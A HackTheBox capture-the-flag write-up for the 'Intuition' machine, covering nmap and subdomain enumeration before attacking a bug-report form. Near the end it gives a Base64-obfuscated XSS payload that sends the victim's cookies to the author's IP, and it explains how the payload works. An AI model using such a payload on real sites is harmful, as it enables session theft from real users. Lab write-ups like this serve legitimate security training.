# HackTheBox - Intuition

We start with our nmap scan which reveals a subdomain which we add to our `/etc/hosts` and run a subdomain scan against, to search for any hits.

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-13 15:09 EDT
Nmap scan report for 10.10.11.15
Host is up (0.036s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)
|_  256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://comprezzor.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.31 seconds
```

Our wfuzz scan reveals 3 subdomains which we add to our `/etc/hosts` and then begin enumerating.

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Working from the "report" domain we find that we can report an issue, which takes us to the "auth" subdomain which requires us to login.

<figure><img src=".gitbook/assets/qm9A9rvk2H.png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/bg6DWAuwH4.png" alt=""><figcaption></figcaption></figure>

We simply trust the process and create an account which then allows us to submit a report, which is simply a title and text box.

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

We try a simple HTML code injection vulnerability into both text boxes, which if successful, would attempt to retrieve an img from our IP, which we'd be hosting a webserver on. Unfortunately, there is no indication that this has worked with a standard message being displayed.&#x20;

<figure><img src=".gitbook/assets/image (123).png" alt=""><figcaption></figcaption></figure>

Curious to see whether we could use XSS here, we think back [#user](hackthebox-headless.md#user "mention") for the HackTheBox machine, Headless. We try the same payload in each of these fields but to no avail. Let's switch it up a bit and try our good friend, Base64!

```
<img src=a onerror='eval(atob("ZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC4xOTUvP2Nvb2tpZT0nK2RvY3VtZW50LmNvb2tpZSk="));' />
```

This payload will attempt to load an image from "a", which will fail. On an error, it will then evaluate (run) the code that follows, which starts with "atob" decodes Base64 string, where our Base64 string is set to make a web request to our web server with the current cookie value. If we're going to trigger an XSS vulnerability, this is a good alternative to our previous payload.
